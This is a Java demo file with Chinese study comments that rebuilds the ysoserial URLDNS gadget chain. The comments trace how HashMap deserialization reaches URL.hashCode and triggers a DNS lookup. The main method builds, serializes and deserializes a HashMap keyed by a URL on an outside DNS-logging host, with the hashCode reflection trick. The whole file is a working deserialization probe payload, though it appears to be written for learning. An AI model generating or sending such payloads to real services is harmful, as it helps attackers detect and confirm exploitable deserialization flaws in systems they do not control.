package com.example.ysoserial_demo;

import com.example.commono.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.Map;

public class urldns_demo {
    /*
    URLDNS应该是最简单的一个poc了， 在ysoserial中，只有5行代码
    其gadget为：
    *     HashMap.readObject()
    *       HashMap.putVal()
    *         HashMap.hash()
    *           URL.hashCode()

    HashMap这个在cc的时候已经接触过了，
    还是先生成一个poc, 测试一下

     在URLStreamHandler中，调用了 getHostAddress， 解析了域名
     而调用getHostAddress的函数为hashCode
     ```java
        protected int hashCode(URL u) {
            int h = 0;

            // Generate the protocol part.
            String protocol = u.getProtocol();
            if (protocol != null)
                h += protocol.hashCode();

            // Generate the host part.
            InetAddress addr = getHostAddress(u);
            if (addr != null) {
                h += addr.hashCode();
            } else {
                String host = u.getHost();
                if (host != null)
                    h += host.toLowerCase().hashCode();
            }
     ```
     往上追述，是hashMap的 hash方法，调用了URL类的hashCode函数

     ```java
    # URL类
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
     ```

    ```java
    //hashmap类
    final int hash(Object k) {
        int h = hashSeed;
        if (0 != h && k instanceof String) {
            return sun.misc.Hashing.stringHash32((String) k);
        }

        h ^= k.hashCode();

    private void putForCreate(K key, V value) {
        int hash = null == key ? 0 : hash(key);
        int i = indexFor(hash, table.le
    ```

    所以整个调用链也清楚了， 需要生成一个URLStreamHandler的对象，将其作为hashMap的key值，反序列化
    首先看URLStreamHandler类, 该类是一个抽象类， 需要实现这个类，只能用该类的子类

    在hashMap类中， 看到`putForCreate`是将key作为hash的参数的，所以URL类应该为其key, value可随便

    但是奇怪的是，在利用生成的poc时，只生成了一条DNS记录，但是自己的利用代码，序列化和反序列化各生成了一条
    猜测是最后一条poc命令， 反射将hashcode置为-1

    搜了一下， 找到了这一条： https://leokongwq.github.io/2016/12/31/java-magic-java-dot-net-dot-url.html
    ```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
    ````

    说明在hashcode != -1的时候，将直接返回 ，否则会计算一次，
    此时会调用hashCode内的 getHostAddress,

    而在put方法时，会调用hash(key)的方法
    最后会在URLStreamHandler类的 getHostAddress 函数中，调用  `InetAddress.getByName(host)`解析
    ```java
    protected synchronized InetAddress getHostAddress(URL u) {
        if (u.hostAddress != null)
            return u.hostAddress;

        String host = u.getHost();
        if (host == null || host.equals("")) {
            return null;
        } else {
            try {
                u.hostAddress = InetAddress.getByName(host);
            } catch (UnknownHostException ex) {
                return null;
            } catch (SecurityException se) {
                return null;
            }
        }
        return u.hostAddress;
    }
    ```

    所以ysoserial的UrlStreamHandler类， 重写了该方法，返回null, 则不生成
    通过将hashCode输出，可以看到如果不采用反射的话，则反序列化不成功。
    ```java
        Field field = url.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        Object o = field.get(url);
        System.out.println(o.toString());
    ```

    所以这几步都是必须的。
    声明一个URLStreamHandler 子类，重写`InetAddress`反回null
    作为key，将URL对象put到一个HashMap对象中去，
    反射将URL的`hashCode`置为 -1


     */

    public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException, NoSuchFieldException, IllegalAccessException {
//        File f = new File("/home/uustay/test_urldns.ser");
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
//        objectInputStream.readObject();

        String url_string = "http://testurldns112.uustay.dns.yoyostay.top/sdf";
        SelfUrlStreamHandler selfUrlStreamHandler = new SelfUrlStreamHandler();
        URL url = new URL(null, url_string, selfUrlStreamHandler);
        Map handler = new HashMap();

        handler.put(url, url_string); //此时已经生成过了, hashCode！=1
        Field field = url.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        Object o = field.get(url);
        System.out.println(o.toString());
        field.set(url, -1);
        byte[] b = utils.do_serialize(handler);

        Thread.sleep(6000);
        Object a = utils.do_unserialize(b);



    }
}
